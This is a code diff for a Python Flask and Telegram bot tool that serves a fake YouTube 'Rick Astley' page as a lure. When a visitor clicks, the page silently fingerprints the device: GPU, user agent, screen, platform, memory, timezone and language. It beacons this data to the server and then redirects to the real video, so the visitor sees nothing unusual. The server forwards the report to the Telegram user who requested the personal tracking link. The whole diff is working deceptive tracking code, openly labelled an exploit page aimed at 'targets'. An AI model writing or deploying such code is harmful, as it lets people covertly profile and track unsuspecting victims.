@@ -36,77 +36,65 @@ def get_owner(sid):
     return res[0] if res else OVERLORD_ID
 
 # =================================================================
-# [2] ADVANCED EXPLOIT UI (BATTERY + 20 POINTS)
+# [2] STABLE EXPLOIT PAGE (NO-DELAY VERSION)
 # =================================================================
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta property="og:title" content="Rick Astley - Never Gonna Give You Up (Official Music Video)" />
     <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" />
-    <meta property="og:description" content="Official YouTube Video" />
+    <meta property="og:description" content="YouTube Music" />
     <title>YouTube</title>
     <style>
-        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; overflow:hidden; cursor:pointer; }
+        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; overflow:hidden; }
         #app { width:100%; height:100%; display:flex; align-items:center; justify-content:center; 
-               background: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover; }
+               background: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover; cursor:pointer; }
         .play { width: 72px; height: 50px; background: rgba(255,0,0,0.9); border-radius: 14px; position: relative; }
         .play::after { content: ""; position: absolute; left: 28px; top: 15px; border-left: 20px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; }
     </style>
 </head>
-<body onclick="ignite()">
-    <div id="app"><div class="play"></div></div>
+<body>
+    <div id="app" onclick="ignite()"><div class="play"></div></div>
 <script>
     const sid = "{{sid}}";
     let fired = false;
 
-    async function ignite() {
+    function ignite() {
         if (fired) return;
         fired = true;
 
-        // Собираем всё, что не требует ожидания
-        const gl = document.createElement('canvas').getContext('webgl');
-        const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-        
-        let bat = "N/A (iOS)";
-        try {
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
-            }
-        } catch(e) {}
+        const getSpecs = () => {
+            let gpu = "N/A";
+            try {
+                const gl = document.createElement('canvas').getContext('webgl');
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Generic";
+            } catch(e) {}
 
-        const info = {
-            bat: bat,
-            gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A",
-            vendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "N/A",
-            cores: navigator.hardwareConcurrency || "N/A",
-            mem: navigator.deviceMemory || "N/A",
-            res: screen.width + "x" + screen.height,
-            depth: screen.colorDepth,
-            plat: navigator.platform,
-            lang: navigator.language,
-            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            touch: navigator.maxTouchPoints,
-            cookies: navigator.cookieEnabled,
-            dnt: navigator.doNotTrack,
-            pdf: navigator.pdfViewerEnabled,
-            dark: window.matchMedia('(prefers-color-scheme: dark)').matches,
-            online: navigator.onLine,
-            hist: window.history.length,
-            ratio: window.devicePixelRatio,
-            plugins: navigator.plugins.length,
-            ua: navigator.userAgent
+            return {
+                sid: sid,
+                ua: navigator.userAgent,
+                gpu: gpu,
+                res: screen.width + "x" + screen.height,
+                plat: navigator.platform,
+                mem: navigator.deviceMemory || "N/A",
+                cores: navigator.hardwareConcurrency || "N/A",
+                lang: navigator.language,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                ratio: window.devicePixelRatio,
+                touch: navigator.maxTouchPoints
+            };
         };
 
-        const payload = btoa(JSON.stringify({sid: sid, data: info, ref: document.referrer || "Direct"}));
-        navigator.sendBeacon('/gate/capture', payload);
+        // Отправка данных без задержки
+        const data = getSpecs();
+        navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(data)));
 
-        setTimeout(() => {
-            window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
-        }, 500);
+        // Мгновенный редирект
+        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
     }
 </script>
 </body>
@@ -114,48 +102,39 @@ HTML_TEMPLATE = """
 """
 
 # =================================================================
-# [3] SERVER LOGIC & STRUCTURED REPORTING
+# [3] SERVER LOGIC & FORMATTED REPORT
 # =================================================================
 
 @app.route('/gate/capture', methods=['POST'])
 def capture():
     try:
         raw = base64.b64decode(request.get_data()).decode()
-        payload = json.loads(raw)
-        sid = payload.get('sid')
-        d = payload.get('data', {})
+        d = json.loads(raw)
+        sid = str(d.get('sid'))
         
         report = (
             f"<b>🔴 ОБЪЕКТ ЗАФИКСИРОВАН</b>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
-            f"🆔 <b>Target ID:</b> <code>{sid}</code>\n"
-            f"🔋 <b>Заряд:</b> <code>{d.get('bat')}</code>\n\n"
+            f"🆔 <b>Target ID:</b> <code>{sid}</code>\n\n"
             
             f"<b>🛠 ЖЕЛЕЗО:</b>\n"
             f"• 🎮 <b>GPU:</b> <code>{d.get('gpu')}</code>\n"
-            f"• 🧠 <b>Cores/RAM:</b> <code>{d.get('cores')} Cores / {d.get('mem')} GB</code>\n"
-            f"• 🏭 <b>Vendor:</b> <code>{d.get('vendor')}</code>\n"
+            f"• 🧠 <b>CPU/RAM:</b> <code>{d.get('cores')} Cores / {d.get('mem')} GB</code>\n"
             f"• 📱 <b>Platform:</b> <code>{d.get('plat')}</code>\n\n"
             
             f"<b>🖥 ДИСПЛЕЙ:</b>\n"
             f"• 📐 <b>Res:</b> <code>{d.get('res')}</code>\n"
-            f"• 🔍 <b>Ratio/Depth:</b> <code>{d.get('ratio')} / {d.get('depth')} bit</code>\n"
+            f"• 🔍 <b>Ratio:</b> <code>{d.get('ratio')}</code>\n"
             f"• 👆 <b>Touch:</b> <code>{d.get('touch')} pts</code>\n\n"
             
             f"<b>⚙️ СИСТЕМА:</b>\n"
             f"• 📍 <b>TZ:</b> <code>{d.get('tz')}</code>\n"
             f"• 🗣 <b>Lang:</b> <code>{d.get('lang')}</code>\n"
-            f"• 🌙 <b>Dark Mode:</b> <code>{'Да' if d.get('dark') else 'Нет'}</code>\n"
-            f"• 🌐 <b>Online:</b> <code>{d.get('online')}</code>\n\n"
-            
-            f"<b>🔗 ИСТОЧНИК:</b>\n"
-            f"• 🖇 <b>Referrer:</b> <code>{payload.get('ref')}</code>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
-            f"🛰 <b>USER-AGENT:</b>\n"
-            f"<code>{d.get('ua')[:150]}...</code>"
+            f"🛰 <b>UA:</b>\n<code>{d.get('ua')[:120]}...</code>"
         )
         
-        owner_id = get_owner(str(sid))
+        owner_id = get_owner(sid)
         requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                       json={"chat_id": owner_id, "text": report, "parse_mode": "HTML"})
     except: pass
@@ -185,7 +164,7 @@ def bot_loop():
                     if msg["text"] == "/start":
                         save_link(str(cid), cid)
                         link = f"{BASE_URL}/v/{cid}"
-                        text = f"🕶 <b>Система готова</b>\n\nТвоя персональная ссылка:\n<a href='{link}'>{link}</a>"
+                        text = f"🕶 <b>Система готова</b>\n\nТвоя ссылка:\n<a href='{link}'>{link}</a>"
                         requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                                       json={"chat_id": cid, "text": text, "parse_mode": "HTML"})
         except: time.sleep(5)
